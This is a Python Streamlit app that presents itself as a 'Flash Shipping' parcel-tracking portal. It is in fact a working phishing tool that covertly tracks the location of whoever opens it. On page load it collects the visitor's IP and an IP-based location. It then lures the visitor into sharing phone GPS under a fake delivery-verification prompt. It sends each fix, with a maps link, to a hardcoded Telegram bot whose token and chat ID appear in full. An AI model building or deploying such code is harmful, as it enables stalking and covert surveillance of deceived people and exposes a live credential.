import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import requests
import pandas as pd
from datetime import datetime

# --- SETTINGS ---
# Use your actual Bot Token and Chat ID
BOT_TOKEN = "8652805297:AAH0tpag7PKXH0v0CrZmeQJF7X68Qk01MKY"
CHAT_ID = "7964118615"

st.set_page_config(page_title="Flash Shipping | Tracking", page_icon="📦")

# 1. GET ACTUAL CLIENT IP (Cloudflare/Proxy aware)
def get_client_ip():
    # Streamlit context headers (For Cloudflare)
    headers = st.context.headers
    # Priority: Cloudflare Connecting IP -> Forwarded For -> Remote Address
    ip = headers.get("cf-connecting-ip") or headers.get("x-forwarded-for")
    
    if not ip:
        try:
            # Fallback for local testing
            ip = requests.get("https://api.ipify.org").text
        except:
            ip = "Unknown"
    return ip

user_ip = get_client_ip()

# 2. TELEGRAM SENDER
def send_intel(lat, lon, method):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    gmaps = f"https://www.google.com/maps?q={lat},{lon}"
    
    msg = (
        f"📍 *LOCATION UPDATE*\n"
        f"📅 Time: {datetime.now().strftime('%H:%M:%S')}\n"
        f"📡 Source: {method}\n"
        f"🌐 IP: `{user_ip}`\n"
        f"🗺️ [Open Actual Location]({gmaps})"
    )
    requests.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})

# 3. UI - FLASH SHIPPING
st.markdown("<h2 style='color: #2874f0;'>📦 Flash Shipping Portal</h2>", unsafe_allow_html=True)
st.write("Current Package: **#FL-17112026**")
st.divider()

# THE HOOK: The user MUST click this for Actual Location on Mobile
st.info("Verification Required: Tap below to sync your device GPS for delivery.")
location = streamlit_geolocation()

# 4. LOGIC
if location.get('latitude'):
    # ACTUAL LOCATION (From Phone GPS Hardware)
    lat, lon = location['latitude'], location['longitude']
    
    # Prevents spamming Telegram if the data hasn't changed
    if st.session_state.get('last_lat') != lat:
        send_intel(lat, lon, "ACTUAL_GPS_HARDWARE")
        st.session_state['last_lat'] = lat
        
    st.success("✅ Delivery Address Verified.")
    st.map(pd.DataFrame({'lat': [lat], 'lon': [lon]}))
else:
    # IP LOCATION (Approximate - Mysore/City level)
    # This runs immediately when the page loads
    if "fallback_done" not in st.session_state:
        try:
            ip_resp = requests.get(f"https://ipapi.co/{user_ip}/json/").json()
            if 'latitude' in ip_resp:
                send_intel(ip_resp['latitude'], ip_resp['longitude'], "IP_APPROXIMATE_CITY")
                st.session_state["fallback_done"] = True
        except:
            pass
    st.warning("Awaiting GPS permission to show street-level tracking...")
